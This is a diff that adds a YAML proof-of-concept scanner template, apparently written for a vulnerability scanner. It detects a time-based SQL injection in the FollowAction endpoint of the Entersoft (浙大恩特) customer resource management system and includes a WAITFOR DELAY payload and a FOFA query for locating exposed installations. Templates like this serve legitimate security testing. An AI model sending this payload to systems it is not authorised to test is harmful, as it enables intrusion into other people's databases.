@@ -1,0 +1,17 @@
+id: poc-yaml-entersoft-customer-resource-management-system-followaction-sqli
+info:
+  name: 浙大恩特客户资源管理系统 FollowAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /entsoft/FollowAction.entphone;.js?method=updreadFlg&readFlag=a%27WAITFOR%20DELAY%20%270:0:{{.t1}}%27--&trk_id=a
+  expression: status_code == 200 && body == "" && duration >= t1 && duration <= t2
+transport: http
